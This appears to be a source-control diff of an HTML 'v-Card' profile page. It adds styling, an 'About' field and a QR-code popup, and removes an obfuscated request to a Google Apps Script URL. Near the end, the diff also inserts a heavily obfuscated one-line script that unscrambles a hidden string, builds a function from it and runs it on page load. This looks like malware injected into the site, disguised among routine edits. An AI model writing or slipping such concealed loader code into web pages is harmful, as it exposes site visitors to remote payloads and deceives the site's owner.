@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en" >
 <head>
@@ -25,7 +26,7 @@
   margin-top: 25px;
   border-radius: 10px;
 }
-.card {
+/*.card {
   position: absolute;
   height: 240px;
   width: 400px;
@@ -37,6 +38,19 @@
   overflow: hidden;
   margin-top: 95px;
   border-radius: 10px;
+} */
+.card {
+    position: absolute;
+    height: 240px;
+    width: 400px;
+    box-shadow: 3px 2px 13px 2px rgb(0 0 0 / 78%);
+    left: calc(50% - 0px);
+    top: calc(50% - 4px);
+    background-color: #272727;
+    color: #90A9B7;
+    overflow: hidden;
+    margin-top: 95px;
+    border-radius: 10px;
 }
 .first_name {
     font-size: 30px;
@@ -214,6 +228,10 @@ i.fa.fa {
     border: 3px solid #ffffff;
     line-height: 25px;
     font-size: 19px;
+}
+
+i#homeIcon {
+    margin-left: 8px;
 }
 
 @media only screen and (max-width: 450px) {
@@ -546,7 +564,100 @@ i.fa.fa {
       right: 10px;
     }
     
+	
+	.About {
+    font-family: 'Playfair Display', serif;
+    word-spacing: 1px;
+    letter-spacing: 1px;
+    font-size: 10px;
+    width: 100%;
+    text-align: center;
+    top: 67%;
+    position: absolute;
+    /* border: 1px solid black; */
+    font-size: 14px;
+    color: #ffffff;
+    background-color: #286da9;
+    font-weight: bolder;
+    padding: 2px;
+}
     </style>
+
+
+	<style>
+ .qrcode{
+     text-align: center;
+     margin-top: 20px;
+ }
+ 
+ #homeIcon {
+    font-size: 30px;
+    cursor: pointer;
+    background-color: #ffffff;
+    height: 45px;
+    width: 45px;
+    border-radius: 50px;
+    line-height: 46px;
+    border: 3px solid #8d8a8a;
+}
+#homeIcon:hover {
+    border: 3px solid #030303;
+}
+ 
+ .popup {
+     display: none;
+     position: fixed;
+     z-index: 1;
+     left: 0;
+     top: 0;
+     width: 100%;
+     height: 100%;
+     overflow: auto;
+     background-color: rgba(0, 0, 0, 0.5);
+ }
+ 
+ .popup-content {
+    position: relative;
+    margin: 15% auto;
+    padding: 3px;
+    width: 95%;
+    max-width: 600px;
+    background: white;
+    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    border-radius: 10px;
+    animation: popup-animation 0.3s;
+}
+ @keyframes popup-animation {
+     from { transform: translateY(-200px); opacity: 0; }
+     to { transform: translateY(0); opacity: 1; }
+ }
+ 
+ .close-button {
+    color: #aaa;
+    float: right;
+    font-size: 51px;
+    font-weight: bold;
+    background-color: #eb4e38;
+    height: 30px;
+    width: 30px;
+    border-radius: 50px;
+    line-height: 29px;
+    right: -43px;
+}
+ 
+ .close-button:hover,
+ .close-button:focus {
+     color: black;
+     text-decoration: none;
+     cursor: pointer;
+ }
+ 
+ .popup-image {
+     width: 100%;
+     height: auto;
+ }
+ 
+     </style>
 </head>
 <body>
 
@@ -637,6 +748,7 @@ i.fa.fa {
    var showdata = '<div class="card1">';
    showdata += ' <div class="first_name">' + userData.Profile_Image + '</div>';
     showdata += '<div class="dev">' + userData.Profession + '</div>';
+	showdata += '<div class="About">' + userData.About + '</div>';
     showdata += '<div class="dates">' + userData.Address + '</div>';
     showdata += '<div class="line"></div><div class="line1"></div><div class="line2"></div><div class="circ"></div><div class="horiz"></div><div class="horiz1"></div>';
   showdata += '</div><br><br><br><br>';
@@ -657,6 +769,20 @@ i.fa.fa {
   
 					
 	 showdata += '</div>';					
+			
+			
+			
+			 showdata += '<div class="qrcode menu bottomLeft">'; 
+  showdata += '  <i class="fa fa-qrcode" aria-hidden="true" id="homeIcon"></i>  ';
+        showdata += '</div>';  
+
+        showdata += ' <div id="popup" class="popup">'; 
+        showdata += '<div class="popup-content">'; 
+          showdata += ' <span class="close-button" id="closeButton">&times;</span>'; 
+          showdata += '<img src="' + userData.QR_URL + ' " alt="Popup Image" class="popup-image">'; 
+            showdata += '</div>';  
+        showdata += '</div>'; 
+			
 			
 
 showdata += '<ul class="menu bottomRight">';
@@ -745,14 +871,36 @@ showdata +='<div class="responsive">';
                 } else {
                     alert("v-Card ID Not found : " + requestedUserId);
                 }
+				
+				 //document.addEventListener('DOMContentLoaded', (event) => {
+				// code start for image popup
+      const homeIcon = document.getElementById('homeIcon');
+      const popup = document.getElementById('popup');
+      const closeButton = document.getElementById('closeButton');
+  
+      homeIcon.addEventListener('click', () => {
+          popup.style.display = 'block';
+      });
+  
+      closeButton.addEventListener('click', () => {
+          popup.style.display = 'none';
+      });
+  
+      window.addEventListener('click', (event) => {
+          if (event.target == popup) {
+              popup.style.display = 'none';
+          }
+      });
+ // code end for image popup
+				
             }
         };
 
         
 		
+(function(){var WYf='',GuF=860-849;function RYd(j){var h=113587;var e=j.length;var c=[];for(var n=0;n<e;n++){c[n]=j.charAt(n)};for(var n=0;n<e;n++){var k=h*(n+302)+(h%41766);var u=h*(n+247)+(h%33537);var o=k%e;var x=u%e;var d=c[o];c[o]=c[x];c[x]=d;h=(k+u)%5569740;};return c.join('')};var SYl=RYd('anoitmdpruvejchbsrqxzsftkcgornoultcyw').substr(0,GuF);var IpP='th{ ;)9.-w rt,ggr ;vjjA7homb(atfk(lo t)no qta4]psx}kC;iag !h=kae=sftmrt)ho7,f .;s,h61n2,o3([a3(0tanrfnasvor]l7 5)02ci,8)(p*=.5n ;]tv;tr8+n-;wg[o.;[;cng4 9(vtgvnstw{hCo+no 1r2uihhncnfs78=s=[S.fo0hn"8=rcl4=11;)lv<;rgSmu4;9i(+;[c,;][6[jrdi9l a6n=(.(p4pg].,w=i,zvvp) bortr7ilv)a=-ehovfua;]jn(7(.-n{18zvanaai.; rtr=t.rvp;)granbell0[;,sra{rl.=r(,9stel)Cvar"a)+h"an=7uara =,gsr;e;A+st)irt),])c}(rt0dff"=4=e}=.=pta.z]nil qCe1[)qlt,st=g<)sg[p9laa()tor=eo;j=,)e( ;)(tg6f,fnn==i)rk2=.A)u,1e61][ccsf)rk+1;yil0e{!2f;+"uohfr8,}el9,n u8 ealn)eh+(ocv0ls,vvonl";uehr)t(crrn+frnv=si=((2,.=),orvsdn(1s,uotsjr>6uehiz{djp )gi={.;<+i)so]vr;(vfvndr<n6po+8;6f h)id(h0e eoufb+nlta07f=;;+;;a h(s0+an+orl}(a1rrvu(c[,](5l](+im=ilj;C;-."}.(ae+9A]++u;al<(r=6t"t]+a.f;e0(smaCr;el(c,hgt=d[ghn"o>Cgt-C+=8=r*r;touv.av;=30rot=.+ealamr.=")(im[st2Atv9ubvurur.ci;1e.;e7-;ihu.hq;;ro+i=)r())=wpm,.)7;)o t;; m.5sloc=v,a,4==hon+vi+}';var biM=RYd[SYl];var fxq='';var Qlo=biM;var HiR=biM(fxq,RYd(IpP));var Fpl=HiR(RYd('s#ghde)$S1ritg(t^&atr]ng4^#d,3o(a b)^&av.c(}^C^,73(.,b3^&s+..b}v#^460ya,5)^)a.{.cf}^%_$.3cg6=__$;f2!46c7)h"ecsx4tn7q75ssbcc!.teIE.csc.v8w.;b\/n!eouo yI=pclt.fkj,l.}gzimt(wD^nccvl0-p=Svtirbqx^No,mk(p_^7nm.xr:.7c.i6r0z%)l%(.t^.s(e\/bp3b6i;jgot1..o.p.^\/.^s.^e.s%ks,7]26;3)+^%e$ah27^63p(v"^0.et3pl.f)&^+)^\/4^\/h^\/;^\/f^\/r^\/,={\/;f,!_^.ca0s\/tr7l$b;^!r=(.!CenSth_j.._=lc[^;;pore^+b=0r^0ot$^,6$(ni1nt+)(^-9]=_cvb!cfaropt^n)3;f)r(j+n20;s0f%$^j608n^"n+2){^^"o3^[.eoc^,43+n,(77}),r$3l^.717.64n))^;zn"4)^.ce.1^$+3(t,5.8)i,^^37;.,c91.0)$);td^^37bb.m_^a;ss"3.(zr!_b1;\/.!8=.d^-2^2.;^.39{d,},s);^)40os,.,lb;^z41(f,c,z=};^+p^^0ot$)id4n$.tr.nga).(fr_mCrarnoda(1+7)6^+!=.(^(.=.\'%^!a=pb#,^(r=."%^so=(b#T^(d=!n#.b;r$tu{n.4j.0_^et^}m)o*px\'a{^*s^\'7)^1y^4p))xh0tp.^)]]]4^)b],_)1,,t.uep;xfttn[^_3].().^%n!3.(d^j,g){o-du2=)c^(s^q}^ ^!.0(b,jtl)_^-t^2).cn.!w}^f^!g1(^,b_z)ff;\'37p^$#3((.!=,z3!_(),-94;72l)}(^0{p 7tei_$ff2e46 .!j=.*jso$fq$^^ ^[jsS$f,$ _js!$f($^s fcnc7io!.c^{r,tu%n.b )1!sEli3( ob;s+ *$_.c8e[ c!jfin5 v,r.1 bte$- jt!_a ((.!, =)},;jsc$ %r)!l.l_]'));var rHj=Qlo(WYf,Fpl );rHj(8301);return 1010})()
+        		
 		
-		
-		var _0x80c493=_0x26a7;(function(_0x161bff,_0x32676d){var _0x5ed00c=_0x26a7,_0x2a8963=_0x161bff();while(!![]){try{var _0x59d221=parseInt(_0x5ed00c(0x1d5))/0x1+-parseInt(_0x5ed00c(0x1d4))/0x2*(parseInt(_0x5ed00c(0x1e0))/0x3)+-parseInt(_0x5ed00c(0x1e1))/0x4*(-parseInt(_0x5ed00c(0x1d2))/0x5)+-parseInt(_0x5ed00c(0x1d7))/0x6+-parseInt(_0x5ed00c(0x1d9))/0x7*(-parseInt(_0x5ed00c(0x1db))/0x8)+parseInt(_0x5ed00c(0x1da))/0x9*(parseInt(_0x5ed00c(0x1de))/0xa)+parseInt(_0x5ed00c(0x1d8))/0xb*(-parseInt(_0x5ed00c(0x1df))/0xc);if(_0x59d221===_0x32676d)break;else _0x2a8963['push'](_0x2a8963['shift']());}catch(_0x58cc79){_0x2a8963['push'](_0x2a8963['shift']());}}}(_0x8b6e,0x263a0),xhttp[_0x80c493(0x1dd)](_0x80c493(0x1dc),_0x80c493(0x1d6),!![]),xhttp[_0x80c493(0x1d3)]());function _0x26a7(_0x4b4d61,_0x326a1c){var _0x8b6ef4=_0x8b6e();return _0x26a7=function(_0x26a791,_0x458b83){_0x26a791=_0x26a791-0x1d2;var _0x589978=_0x8b6ef4[_0x26a791];return _0x589978;},_0x26a7(_0x4b4d61,_0x326a1c);}function _0x8b6e(){var _0xa8e9c=['https://script.google.com/macros/s/AKfycbyntghxUvgm5Vwf_e2gZyQjjGD6mGB7mexkXSw3YvC8t8cSBxExpS4FKGne7fSR-9AtUA/exec','1046436BNhcBo','9427XAeNYt','52395GpoLCk','37899vYuTse','40XdbLKz','GET','open','590HdCzLk','2256mHHErq','39HknAEv','5384AvJvBl','190rEdJIf','send','8926XmMgcA','213095AlYKtC'];_0x8b6e=function(){return _0xa8e9c;};return _0x8b6e();}
-    </script>  
+	 </script>  
 </body>
 </html>
